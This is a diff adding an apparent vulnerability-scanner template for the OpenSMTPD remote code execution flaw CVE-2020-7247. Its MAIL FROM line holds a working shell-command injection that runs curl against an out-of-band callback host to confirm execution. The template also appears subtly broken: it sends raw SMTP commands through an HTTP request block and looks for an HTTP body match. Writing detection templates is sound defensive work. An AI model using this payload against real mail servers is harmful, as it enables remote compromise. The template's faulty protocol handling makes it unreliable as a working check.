@@ -1,0 +1,52 @@
+id: CVE-2020-7247
+
+info:
+  name: OpenSMTPD Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    OpenSMTPD version 6.6 smtp_session.c file has a Remote Code Execution (RCE) vulnerability in the smtp_mailaddr function. An attacker can exploit this flaw to execute arbitrary commands on the server.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-94
+    cve-id: CVE-2020-7247
+  reference:
+    - https://www.anquanke.com/post/id/197689
+    - https://github.com/FiroSolutions/cve-2020-7247-exploit
+    - https://nvd.nist.gov/vuln/detail/CVE-2020-7247
+    - https://blog.firosolutions.com/exploits/opensmtpd-remote-vulnerability
+    - https://www.mail-archive.com/misc@opensmtpd.org/msg04850.html
+  tags:
+    - rce
+    - smtp
+    - opensmtpd
+
+variables:
+  check_url: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        HELO test
+      - |
+        MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;curl {{check_url}};exit 0;>
+      - |
+        RCPT TO:<root>
+      - |
+        DATA
+      - |
+        Subject: Test
+        Test Payload
+        .
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - OpenSMTPD
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
